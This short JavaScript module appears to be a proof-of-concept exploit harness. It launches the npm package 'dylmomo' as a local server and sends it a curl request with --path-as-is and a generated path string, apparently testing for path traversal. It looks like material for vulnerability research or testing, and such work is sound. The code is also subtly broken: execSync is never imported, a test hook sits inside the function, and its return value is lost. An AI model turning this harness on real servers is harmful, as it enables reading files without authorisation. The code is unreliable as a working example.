function exploitFunction(payload) {
  const { genstr } = payload;

  afterAll(() => {
    try {
      execSync("fuser -k 8888/tcp");
    } catch (e) {}
  });

  const path = require("path");
  const { sleep } = require("sleep");
  const { exec } = require("child_process");

  let server = "node ./node_modules/dylmomo/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    return stdout; // Return the output for verification
  });
}

module.exports = { exploitFunction };